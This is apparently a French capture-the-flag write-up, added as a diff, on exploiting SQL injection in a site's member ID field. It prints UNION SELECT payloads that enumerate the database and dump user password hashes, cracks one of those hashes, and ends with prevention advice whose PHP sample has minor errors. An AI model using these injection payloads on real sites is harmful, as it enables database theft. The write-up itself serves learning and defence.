@@ -1,0 +1,123 @@
+Sur la page (/index.php?page=member), on a joué avec le formulaire avec le champ unique demandant un ID.
+En entrant des caractètes non numériques, on a ce message "Unknown column 'a' in 'where clause'", ce qui indique que le site retourne directement la réponse de la bdd.
+
+https://portswigger.net/web-security/sql-injection/examining-the-database
+
+On a d'abord trouvé une faille d'injection SQL en entrant "1 OR 1", qui affiche tous les utilisateurs du site dont (First name: Flag, Surname : GetThe).
+On a cherché a exploiter cette faille en trouvant comment était construite la BDD.
+
+Une mauvaise syntaxe affiche "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...", donc on est sur du MySQL.
+
+https://www.asafety.fr/mysql-injection-cheat-sheet/
+
+La requête "1 OR 1 UNION SELECT schema_name, schema_name FROM information_schema.schemata" donne comme noms de schema :
+- information_schema
+- Member_Brute_Force
+- Member_Sql_Injection
+- Member_guestbook
+- Member_images
+- Member_survey
+
+La requête "1 OR 1 UNION SELECT table_name, table_name  FROM information_schema.tables" donne les noms des tables :
+- CHARACTER_SETS
+- COLLATIONS
+- COLLATION_CHARACTER_SET_APPLICABILITY
+- COLUMNS
+- COLUMN_PRIVILEGES
+- ENGINES
+- EVENTS
+- FILES
+- GLOBAL_STATUS
+- GLOBAL_VARIABLES
+- KEY_COLUMN_USAGE
+- PARAMETERS
+- PARTITIONS
+- PLUGINS
+- PROCESSLIST
+- PROFILING
+- REFERENTIAL_CONSTRAINTS
+- ROUTINES
+- SCHEMATA
+- SCHEMA_PRIVILEGES
+- SESSION_STATUS
+- SESSION_VARIABLES
+- STATISTICS
+- TABLES
+- TABLESPACES
+- TABLE_CONSTRAINTS
+- TABLE_PRIVILEGES
+- TRIGGERS
+- USER_PRIVILEGES
+- VIEWS
+- INNODB_BUFFER_PAGE
+- INNODB_TRX
+- INNODB_BUFFER_POOL_STATS
+- INNODB_LOCK_WAITS
+- INNODB_CMPMEM
+- INNODB_CMP
+- INNODB_LOCKS
+- INNODB_CMPMEM_RESET
+- INNODB_CMP_RESET
+- INNODB_BUFFER_PAGE_LRU
+- db_default
+- users
+- guestbook
+- list_images
+- vote_dbs
+
+On a essayé cette requête ("1 OR 1 UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name = "users"")
+pour avoir les colonnes de la table "users" mais ça ne marchait pas "erreur syntaxe", puis on tenté celle-ci :
+"1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns"
+elle est moins pratique pour la lecture, mais passe la syntaxe. On peut econstruire les tables :
+
+Table : users
+- user_id
+- first_name
+- last_name
+- town
+- country
+- planet
+- Commentaire
+- countersign
+
+Table : guestbook
+- id_comment
+- comment
+- name
+
+Table : list_images
+- id
+- url
+- title
+- comment
+
+Table : vote_dbs
+- id_vote
+- vote
+- nb_vote
+- subject
+
+On peut alors tester plusieurs requêtes (on ne peut afficher les colonnes que 2 à 2), dont :
+"1 OR 1 UNION SELECT commentaire, countersign FROM users", on a construit la table users avec les datas :
+
+First name		Surname		Town		Country		Planet	Commantaire						Countersign
+Barack Hussein	Obama		Honolulu	America		Earth	Amerca !						2b3366bcfd44f540e630d4dc2b9b06d9 (YesWeCan)
+Adolf			Hitler		Berlin		Allemagne	Earth	Ich spreche kein Deutsch.		60e9032c586fb422e2c16dee6286cf10 (oktoberfest)
+Joseph			Staline		Moscou		Russia		Earth	????? ????????????? ?????????	e083b24a01c483437bcf4a9eea7c1b4d
+Flag			GetThe		42			42			42		Decrypt this password -> then 	5ff9d0165b4f92b14994e5c685cdce28
+															lower all the char. Sh256 on 
+															it and it's good !		
+
+
+Décrypter le countersign "5ff9d0165b4f92b14994e5c685cdce28" en MD5 donne "FortyTwo", et le sha256 de "fortytwo" donne un hash de taille 256 bits,
+ce qui correspond à la taille d'un flag.
+
+
+On voit donc l'importance de protéger son serveur des injections SQL qui peuvent faire des ravages.
+
+Il ne faut pas construire ses requêtes SQL en concaténant directement des strings. Il faut contrôler et valider ce qu'envoit l'utilisateur (ici on voulait que des chiffres). Chaque variables données doit être convertie pour echaper les caractères qui ont un sens en SQL. Il est aussi préférable d'utiliser les Prepared Statements avec les requetes d'un côté "SELECT ? FROM ? WHERE column = ?", et les paramètres de l'autre.
+Ex PHP : 
+
+$statement = $mysqli->prepare("SELECT FROM login WHERE user=? AND pass=?");    
+$statement->mysqli_bind_param("ss", $username, $password);
+$statement->execute();
